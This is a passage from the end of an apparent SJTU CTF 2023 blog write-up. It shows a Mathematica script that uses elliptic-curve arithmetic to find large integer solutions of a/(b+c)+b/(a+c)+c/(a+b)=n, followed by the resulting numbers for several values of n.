+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sol</span><span class="o">=</span><span class="n">Solve</span><span class="p">[{</span><span class="n">Echo</span><span class="p">[</span><span class="n">y</span><span class="o">^</span><span class="mi">2</span><span class="o">==</span><span class="n">x</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="mi">2</span><span class="o">+</span><span class="n">A</span><span class="w"> </span><span class="n">x</span><span class="o">+</span><span class="n">B</span><span class="p">),</span><span class="s">&#34;Ec: &#34;</span><span class="p">],</span><span class="n">y</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">,</span><span class="n">x</span><span class="o">!=</span><span class="mi">0</span><span class="p">},{</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">},</span><span class="n">Integers</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ji</span><span class="o">=</span><span class="n">DeleteCases</span><span class="p">[{</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">}</span><span class="o">/.</span><span class="n">sol</span><span class="p">,{</span><span class="n">x</span><span class="p">,</span><span class="n">ConditionalExpression</span><span class="p">[</span><span class="nv">_</span><span class="p">,</span><span class="nv">_</span><span class="p">]}]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">iv</span><span class="o">=</span><span class="n">Interval</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{(</span><span class="mi">3-12</span><span class="n">n</span><span class="mi">-4</span><span class="n">n</span><span class="o">^</span><span class="mi">2</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="o">-</span><span class="p">(</span><span class="mi">2</span><span class="n">n</span><span class="o">+</span><span class="mi">5</span><span class="p">)</span><span class="n">Sqrt</span><span class="p">[</span><span class="mi">4</span><span class="n">n</span><span class="o">^</span><span class="mi">2</span><span class="o">+</span><span class="mi">4</span><span class="n">n</span><span class="mi">-15</span><span class="p">]</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span><span class="mi">-2</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">3</span><span class="p">)(</span><span class="n">n</span><span class="o">+</span><span class="n">Sqrt</span><span class="p">[</span><span class="n">n</span><span class="o">^</span><span class="mi">2-4</span><span class="p">])},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="mi">-2</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">3</span><span class="p">)(</span><span class="n">n</span><span class="o">-</span><span class="n">Sqrt</span><span class="p">[</span><span class="n">n</span><span class="o">^</span><span class="mi">2-4</span><span class="p">]),</span><span class="mi">-4</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">2</span><span class="p">)}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">]</span><span class="o">//</span><span class="n">N</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sp</span><span class="o">=</span><span class="p">{</span><span class="mi">-100</span><span class="p">,</span><span class="mi">260</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ECplusN</span><span class="p">[</span><span class="nv">p1_</span><span class="p">,</span><span class="nv">p2_</span><span class="p">]</span><span class="o">:=</span><span class="n">Chop</span><span class="o">@</span><span class="n">N</span><span class="o">@</span><span class="n">EllipticExp</span><span class="p">[</span><span class="n">EllipticLog</span><span class="p">[</span><span class="n">p1</span><span class="p">,</span><span class="n">para</span><span class="p">]</span><span class="o">+</span><span class="n">EllipticLog</span><span class="p">[</span><span class="n">p2</span><span class="p">,</span><span class="n">para</span><span class="p">],</span><span class="n">para</span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">nl</span><span class="o">=</span><span class="n">NestWhileList</span><span class="p">[</span><span class="n">ECplusN</span><span class="p">[</span><span class="n">sp</span><span class="p">,</span><span class="nv">#</span><span class="p">]</span><span class="o">&amp;</span><span class="p">,</span><span class="n">sp</span><span class="p">,</span><span class="o">!</span><span class="n">IntervalMemberQ</span><span class="p">[</span><span class="n">iv</span><span class="p">,</span><span class="n">First</span><span class="o">@</span><span class="nv">#</span><span class="p">]</span><span class="o">&amp;</span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ts</span><span class="o">=</span><span class="err">%</span><span class="o">//</span><span class="n">Length</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ECplus</span><span class="p">[</span><span class="nv">p1_</span><span class="p">,</span><span class="nv">p2_</span><span class="p">]</span><span class="o">:=</span><span class="n">Block</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">,</span><span class="n">k</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">x1</span><span class="p">,</span><span class="n">y1</span><span class="p">,</span><span class="n">x2</span><span class="p">,</span><span class="n">y2</span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">}</span><span class="o">=</span><span class="n">para</span><span class="p">;{</span><span class="n">x1</span><span class="p">,</span><span class="n">y1</span><span class="p">}</span><span class="o">=</span><span class="n">p1</span><span class="p">;{</span><span class="n">x2</span><span class="p">,</span><span class="n">y2</span><span class="p">}</span><span class="o">=</span><span class="n">p2</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="n">x</span><span class="p">,</span><span class="o">-</span><span class="n">y</span><span class="p">}</span><span class="o">/.</span><span class="n">If</span><span class="p">[</span><span class="n">p1</span><span class="o">==</span><span class="n">p2</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">Solve</span><span class="p">[{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">y</span><span class="o">^</span><span class="mi">2</span><span class="o">==</span><span class="n">x</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="mi">2</span><span class="o">+</span><span class="n">A</span><span class="w"> </span><span class="n">x</span><span class="o">+</span><span class="n">B</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">(</span><span class="n">y</span><span class="o">-</span><span class="n">y1</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="n">x</span><span class="o">-</span><span class="n">x1</span><span class="p">)</span><span class="o">==</span><span class="p">(</span><span class="mi">3</span><span class="n">x1</span><span class="o">^</span><span class="mi">2</span><span class="o">+</span><span class="mi">2</span><span class="w"> </span><span class="n">A</span><span class="w"> </span><span class="n">x1</span><span class="o">+</span><span class="n">B</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="mi">2</span><span class="n">y1</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">},{</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">}]</span><span class="o">//</span><span class="n">First</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">Solve</span><span class="p">[{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">y</span><span class="o">^</span><span class="mi">2</span><span class="o">==</span><span class="n">x</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="mi">2</span><span class="o">+</span><span class="n">A</span><span class="w"> </span><span class="n">x</span><span class="o">+</span><span class="n">B</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">(</span><span class="n">y</span><span class="o">-</span><span class="n">y1</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="n">x</span><span class="o">-</span><span class="n">x1</span><span class="p">)</span><span class="o">==</span><span class="p">(</span><span class="n">y1</span><span class="o">-</span><span class="n">y2</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="n">x1</span><span class="o">-</span><span class="n">x2</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">x</span><span class="o">!=</span><span class="n">x1</span><span class="p">,</span><span class="n">x</span><span class="o">!=</span><span class="n">x2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">},{</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">}]</span><span class="o">//</span><span class="n">First</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">eci</span><span class="o">=</span><span class="n">Rule</span><span class="o">@@@</span><span class="n">Transpose</span><span class="p">[{{</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">},</span><span class="n">Nest</span><span class="p">[</span><span class="n">ECplus</span><span class="p">[</span><span class="n">sp</span><span class="p">,</span><span class="nv">#</span><span class="p">]</span><span class="o">&amp;</span><span class="p">,</span><span class="n">sp</span><span class="p">,</span><span class="n">ts</span><span class="mi">-1</span><span class="p">]}]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fii</span><span class="o">=</span><span class="n">Solve</span><span class="p">[{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">a</span><span class="o">/</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="p">)</span><span class="o">==</span><span class="p">(</span><span class="mi">8</span><span class="n">n</span><span class="o">+</span><span class="mi">24</span><span class="o">-</span><span class="n">x</span><span class="o">+</span><span class="n">y</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="mi">2</span><span class="p">(</span><span class="mi">4</span><span class="o">-</span><span class="n">x</span><span class="p">)(</span><span class="n">n</span><span class="o">+</span><span class="mi">3</span><span class="p">)),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">b</span><span class="o">/</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="p">)</span><span class="o">==</span><span class="p">(</span><span class="mi">8</span><span class="n">n</span><span class="o">+</span><span class="mi">24</span><span class="o">-</span><span class="n">x</span><span class="o">-</span><span class="n">y</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="mi">2</span><span class="p">(</span><span class="mi">4</span><span class="o">-</span><span class="n">x</span><span class="p">)(</span><span class="n">n</span><span class="o">+</span><span class="mi">3</span><span class="p">)),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">c</span><span class="o">/</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="p">)</span><span class="o">==</span><span class="p">(</span><span class="mi">12</span><span class="o">+</span><span class="mi">4</span><span class="w"> </span><span class="n">n</span><span class="o">+</span><span class="mi">2</span><span class="w"> </span><span class="n">x</span><span class="o">+</span><span class="n">n</span><span class="w"> </span><span class="n">x</span><span class="p">)</span><span class="o">/</span><span class="p">((</span><span class="n">x</span><span class="mi">-4</span><span class="p">)(</span><span class="n">n</span><span class="o">+</span><span class="mi">3</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="o">/.</span><span class="n">eci</span><span class="p">,{</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">},</span><span class="n">Integers</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">finally</span><span class="o">=</span><span class="n">fii</span><span class="o">/.</span><span class="p">{</span><span class="n">ConditionalExpression</span><span class="p">[</span><span class="nv">x_</span><span class="p">,</span><span class="nv">_</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">First</span><span class="o">@</span><span class="n">x</span><span class="p">}</span><span class="o">//</span><span class="n">First</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">c</span><span class="o">/</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">)</span><span class="o">+</span><span class="n">b</span><span class="o">/</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">c</span><span class="p">)</span><span class="o">+</span><span class="n">a</span><span class="o">/</span><span class="p">(</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="p">)</span><span class="o">/.</span><span class="n">finally</span><span class="w">
+</span></span></span></code></pre></div><p>修改n的值，算出有理点之后再修改sp点的坐标，依次计算可得不同k所对应的解。</p>
+<h4 id="exp-5">EXP</h4>
+<p>得到的解如下</p>
+<pre tabindex="0"><code>2：
+3
+1
+1
+————————————————
+4：
+154476802108746166441951315019919837485664325669565431700026634898253202035277999
+36875131794129999827197811565225474825492979968971970996283137471637224634055579
+4373612677928697257861252602371390152816537558161613618621437993378423467772036
+————————————————
+6：
+20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557
+2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447
+1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023
+————————————————
+10：
+269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977
+4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209
+221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347
+————————————————
+12：
+9771648423124723726177348367579036940996321519493182113688185913291912152167430962940286713704689291955030766917703582615167560632692208569350596318361971945750539077074921376878141735974825044184065325295542414690299404543957471585986271492883344336895444628417764598798059282135540264079530839334683089479387712689664348829803188436456581110658900633423526039703131197080466706425129542338489808063522607588342584200312382147588021744331992391832435570655076979943362024164159108464336717094994098309362464023676446199308737155163873551701208488828402974721390557367029987977855707022545910750122799634001172374761109175036019323234546383998982432217361050210984517599581577248801341849448303544088176264625811806142770294209982442408662519374761728070223714521821341117002331986498770555184073085027058095297336167677439607364510657437509486347967307803660171207058735567136463940112222314297317750700776624058908857471453427988612985064899673716630236456014245800912222319599696269373722466085725674157804399937147349826725426492477399825189629059858143754233366556058143229760327782450544023555022700607812759157576200327040510464661565706996737315846564795178593069240330781574428355212732623725876985598328229189126427627014915844367895005634186488060123351425224254658993594181034585580728472926584634345281045130880900933874051988840549119158099281094622771545146573280290125472471508524146960616613046094502775760354004277755376103461683156447272164405834240309654181339266066263159088013664792412947782580562302145769970189263032100245853943329981223091010635294626858575635181685165656502546698206083122664124915608202069269724379843842840589157695219270750118704026028654165401285548616906593019632882729540612247917655897119373938582993296569576361174642805599263009865424731023686421547614323517551093776435182182140089430393766501364362547924371223967349402455455441526984962551991999740939806598094829176294395288025415862487224690038784444479146323714873578973543339383804639812551447024169760867016277652364254017342569664821765700133711906605529500370028326735684760029880824589496327934929890451806466028722732111707352281105526352585578795270682734602251672860466286137618451728577222436372703708755203706276857915607877115578246058172188790243120058005406354006933249427269186026037719060025838643524816124535097800306551506659235785757708355416892809830706818987658005883960242994520660422766140515613930376253008301505691252247843497900812092131062228821968787255843774769294070526791658638255579065403517667805443531566516803268415382062088531458623037511041673490301151134361350520723131052983435925526212885827536368956540475248756348725668932765463359607076032536135984411047176832817954294834358117678876487728677844675188893304999714929142496108422125998795771469689592410179339895441001807800777244298595113076411858026767080234245436677391556512837521159681035996524381164562299217240816526864051747417996965408494564793876350006434149310494879345252225512207327377641046172449349234814800370542810062964918653675533999879633796275182294288725302482565574689774236243367061493493871378478841132541150327804822340923534374347417734327962641422485698737250906970866594251938717273245180046336357159717643987207108520200884860052166562771159345328326046425986193537383085182662821369601389344051970598825589841391881179369502441
+355278342530640706599407170519248057086229224524520519157141107708508537777205114284836515916647281859247795539514644616851559754279314555875406812187972064036035557571299859907280810487149605334993350531002451299724364967645584709273394386591591195780391447196683330849598560271745701404034625131501993929419554266148290436679685445363131010836932629342154128643351678951282983749890989559890172019099261175094354121592456388228285392695032585171051639572467407610797751366649496928321845783437550911111047278383580607079737332894364303410021661677697214580427323420620970187098111338585040445789178378027622721085136875173221486668228434792389270646253382261057411216813326434321501013051997430441500004490156606094833372922100067917450173462555720881102457821630342749340867365008072441643478548721857292917452800697091436767776083635027373005756786010659444917124676112164411021940883874460477540417603487387574930026382803252605451761123854779624051422486933911811669680548762039750465949397184413613720601642705976126017892620552601501858263828583840887458987486197543156013041348847816031608699049912936308450819095510369701575578097250363368454461945148450576088433249713999167088458370351492130049783151127247370858531196993379176146118278989362781036431924069823925694605248692612491891011456236063305446307145213155963155713254947146969705707871047748827652962063454148762245165952045524839856938394353277318602286742502902467957014204949461972627441403014827123154496446151973383417479788921710173738381531711188367127686337683922337834803729129860547622394303860359090631322192199105383221995196638722101561512713080014557011603612235554087760232042126289412640004429367002342732510653670491385158696739998435013535332649487741680965013588417081164473304832663472222330032194673510586568514566505918964524054367862236706513657705601280209392824784214794388906944781256335282029618881491665550233021568492161644797572375050841378822048811169837099457416172794125347941123267556933505091898801954097367551330470039516528938002060368203771887848789933865049084996127893937024390453874088559156599250770154698773410485652163460604146736536998704744308747694562472589990594315082773213352567913224257883617970694009815571365310386133474806148114386493590025948707911857605911663465773207882473351193724108758290123955278061608587631862670149052118711701158527145181175190875795882098138836322507020482823700475885261298942438375141523097467136949344549146226783627312473680145737634678721649048185277680609630836890634565927029420985039606240188037856013124138575514784612402632326680678385133078122001191529488632864949389691396850211361741599166067293474086420940368406413602811300967477515893863371822747402011882565685406820752393426871334343726588669248706316761007252201944198166289444499842118193477939440518068080562630698421649307162223651191249634030063115515307507458592025473811290000412080019218175657190077848458901960552364736984977562980489155298839168694740209782414540433384032643432411675316990421342815443209738155863833108803588186058559389830125622362622871909735505714741871915567556115574951697169999420730845094742737430840794283524289288407229358051139188774198818399680388413331802255608133294263528032850298389448639132253320503425433048688168649080671114897526452528795785075258192344501895197396313877737618743144143311361
+20035885316890023606830534495067252147691357652057772449634307305904187410990992558920956548259424273157355393196003732013539899362716100216100574234193461987992270496600195300035752479460516954902069442618504792465804770124967301970678978328799586707754521255514483172028191260188475400317446571436004845998985653096037624624322281748829779447176083968674969833631184023187122343557933419142060815193896987871898527455938239633288396733679352394480370944272017028820473119804801589995735129329783435030364346676954726243545810431065584725705747425285116415098270756170854793527738400748018356825870940359453012877584220232457239486868961160286561107075730870191541707907024801190678872428378869070743156118725466561031241711673504710114636631852382374234153002593815839905362438349777252361649553219532495089010852188819251924513393843140092077472310502164724666534953510429204661960760251076825195012089967164704751956545716713621200138891509373146662781427659132869096244223556723315169600948861332954354413695888139017122816338494980502776971525437417811441688700350703763215954037112632057856459110596088774179908693660103919027798842365141387313347532358053282282310316931481842456257180432996840651935591189065259608213860227670186727338535935419000104738195984938003074607151510868080842855420074387493775652849570582238533035000592730676469385254313682643506004770455623730437382781957476292884741268313376108166969374162736157947254538709529590451732215030394607575401311261495611074569827532998121985392068544149777898463913810868539866423391561166029673154931578514570213744634449182859448121221325492409874400969111705041715153435314453329592896445669394904690642194906508672813178927078506631317053598793270180912538514259578229993791104172792725314850021809824960706011811171135997354162296978832638498179879771698379520095937384178635037528330099466818183983444951307338720807542182935366038924920803039824818978210615772435040781173000522957795318935743355256682046477991218402526418808672933986788522397056643264167847014634860127505194733579174334258294520958784673856708467904118326279768028815946419189313676293061904510582604099208908846437914476479234000943244508656493406134426802932798305615095458701786048985034479492729357877345432656822502309506336155060754833509042934673647393543153071076853125875966535409760468353908956772073598404677550786987821584368329022155627837041395034568285609452470732829555582976579267394284928019500640977457130634550711478008433495429299640611555109171351069880574540503991840730805473241840138226375586949924647467718787261507459412537764703036454930376493490948212829487213980710738206430842478425877099783023977823272528573428967147461248519564018755183647327105058234798276539268716600710944282509505534186050000996976904596307571400703851012188753774844974808960378596634959429569386969879801494409815032125990390725960817685563429841025885365323217522340255134111238995153536146711806678993879340908664992009441435660169161976982012130533343179316942599654407053716666680671913105456952462060978938905812334117338345608406493320504708189703699696962739031333121998774598083769292025442530856763493460673394201872178090312059357744194235029914560026838488336959743500520432584396018821068625402593286299143852751101612713576613521611747957521749921921568265523624185276246164078350540463107124
+</code></pre></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-03-12&#32;19:52:23>更新于 2023-03-12&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://andreoy.cn/posts/sjtuctf2023-writeup/" data-title="SJTU CTF 2023-WriteUp" data-hashtags="SJTUCTF,信息安全,Web,Misc,Pwn"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://andreoy.cn/posts/sjtuctf2023-writeup/" data-hashtag="SJTUCTF"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Linkedin" data-sharer="linkedin" data-url="https://andreoy.cn/posts/sjtuctf2023-writeup/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Tumblr" data-sharer="tumblr" data-url="https://andreoy.cn/posts/sjtuctf2023-writeup/" data-title="SJTU CTF 2023-WriteUp" data-tags="SJTUCTF,信息安全,Web,Misc,Pwn"><i class="fa-brands fa-tumblr fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Reddit" data-sharer="reddit" data-url="https://andreoy.cn/posts/sjtuctf2023-writeup/"><i class="fa-brands fa-reddit fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://andreoy.cn/posts/sjtuctf2023-writeup/" data-title="SJTU CTF 2023-WriteUp" data-image="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-12%20195727.png"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="https://andreoy.cn/posts/sjtuctf2023-writeup/" data-title="SJTU CTF 2023-WriteUp" data-description=""><i class="fa-brands fa-blogger fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://andreoy.cn/posts/sjtuctf2023-writeup/" data-title="SJTU CTF 2023-WriteUp"><i class="fa-brands fa-evernote fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://andreoy.cn/posts/sjtuctf2023-writeup/" data-title="SJTU CTF 2023-WriteUp"><i class="fa-brands fa-skype fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Trello" data-sharer="trello" data-url="https://andreoy.cn/posts/sjtuctf2023-writeup/" data-title="SJTU CTF 2023-WriteUp" data-description=""><i class="fa-brands fa-trello fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/sjtuctf/">SJTUCTF</a>,&nbsp;<a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>,&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/misc/">Misc</a>,&nbsp;<a href="/tags/pwn/">Pwn</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/zjctf2019-%E9%80%86%E8%BD%AC%E6%80%9D%E7%BB%B4/" class="prev" rel="prev" title="ZJCTF2019-逆转思维"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ZJCTF2019-逆转思维</a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="hzyangjc/hzyangjc.github.io"
+            data-repo-id="R_kgDOIAWwEQ"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOIAWwEc4CRdaC"
+            data-mapping="pathname"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="top"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+          <noscript>
+            Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+          </noscript>
+        </div></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.101.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.16-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中 ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i>&nbsp;<span class="run-times">网站运行中 ...</span></span></div><div class="footer-line ibruce">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":50},"comment":{"enable":true,"giscus":{"darkTheme":"transparent_dark","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 